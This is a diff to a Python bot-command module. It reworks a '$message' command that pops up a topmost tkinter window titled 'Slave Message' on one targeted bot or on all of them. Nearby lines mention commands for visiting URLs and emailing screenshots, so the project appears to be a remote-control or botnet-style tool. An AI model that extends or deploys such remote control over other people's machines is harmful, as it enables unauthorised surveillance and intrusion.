@@ -53,21 +53,21 @@ def vist_url(bot: Bot, args: List[str]):
 
 @BotV2.register('message', all=True, help_text="Message show with tkinter -- Usage: $message [/all | <bot_id>] <message> <msec>")
 def show_msg_with_tk(bot: Bot, args: List[str]):
-    win = Tk()
-    win.title("Slave Message")
-    win.resizable(False, False)
-    lbl = Label(win, text=' '.join(args[1:-1]), font=('Aria Bold', 50))
-    lbl.grid(column=0, row=0)
     sec = args[len(args) - 1]
     if not sec.isnumeric():
         bot.send_text(
             "Command syntax error. Last argument must be millisecond")
-        return 0
-    if int(sec) != 0:
-        win.after(sec, lambda: win.destroy())
-
-    bot.send_text("Opening tkinter frame...")
-    win.mainloop()
+    else:
+        win = Tk()
+        win.title("Slave Message")
+        win.resizable(False, False)
+        lbl = Label(win, text=' '.join(args[1:-1]), font=('Aria Bold', 50))
+        lbl.grid(column=0, row=0)
+        win.attributes("-topmost", True)
+        if int(sec) != 0:
+            win.after(sec, lambda: win.destroy())
+        bot.send_text("Opening tkinter frame...")
+        win.mainloop()
 
 
 @BotV2.register('screenshot', all=True, help_text="Take sceenshot and send your email(Only Gmail)\
